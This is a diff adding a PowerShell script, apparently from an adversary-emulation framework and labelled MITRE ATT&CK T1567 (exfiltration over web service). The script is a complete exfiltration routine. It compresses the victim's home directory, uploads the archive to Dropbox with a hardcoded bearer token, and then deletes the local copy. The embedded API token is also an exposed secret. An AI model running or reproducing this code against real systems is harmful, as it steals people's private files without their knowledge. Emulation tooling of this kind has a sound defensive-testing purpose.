@@ -1,0 +1,62 @@
+#Title: invoke-exfiltrationDropbox
+#Technique: T1567
+#Tactic: TA0010
+
+function invoke-exfiltrationDropbox
+    {
+    <#
+    .SYNOPSIS
+    # This script upload the \Home user directory to Dropbox.
+	# An API token is requiered.
+    .DESCRIPTION
+    Attack Commands: Run with command_prompt! Elevation is not Required (e.g. root or admin)
+
+    .LINK
+
+    #>
+    $good = $false
+    $results = $null
+	# Compress the User folder and send it to the temporary files directory
+	Compress-Archive -Path $env:HOMEPATH -DestinationPath $env:HOMEPATH\AppData\Local\Temp\home.zip
+
+	# Request based on the Laurent Kempé script: https://laurentkempe.com/2016/04/07/Upload-files-to-DropBox-from-PowerShell/
+	# Setting variables for the request
+	$SrcPath =  "$env:HOMEPATH\AppData\Local\Temp\home.zip"
+	$arg = '{ "path": "/home.zip", "mode": "add", "autorename": true, "mute": false }'
+	$token = "sl.ArCMwfs0IqfVWauP2c-D4QD3B8Gx4yhPhRyendfEMqg3g5qklVZbbsVs-ZS3-mC2OJcdhEvSyVf7-nsZUlipfR9rsMSkxfNrxQDM2vqhYNLBvXgXxaPKSsDX55obj_SiHpBZwykDMmQ"
+	$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+	$headers.Add("Authorization", "Bearer $token")
+	$headers.Add("Dropbox-API-Arg", $arg)
+	$headers.Add("Content-Type", 'application/octet-stream')
+	# Make the request
+	$response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SrcPath -Headers $headers
+	
+	# Check if the reques was succesfull 
+	if ($response.is_downloadable) {
+		$good = $true
+		$results = "Exfiltrated files are available on your Dropbox"
+	}
+	else {
+		$results = "Something went wrong uploading the file."
+	}
+	Remove-Item $env:HOMEPATH\AppData\Local\Temp\home.zip
+	return @{results=$results;success=$good}
+}
+
+#Main program
+$execute = {
+
+}
+
+#GiveMeData if needed
+
+#get-credentials
+$execute = invoke-exfiltrationDropbox
+
+#PutData if needed
+  # if($execute.success)
+  # {
+    
+  # }
+
+return @{results=$execute.results;success=$execute.success}
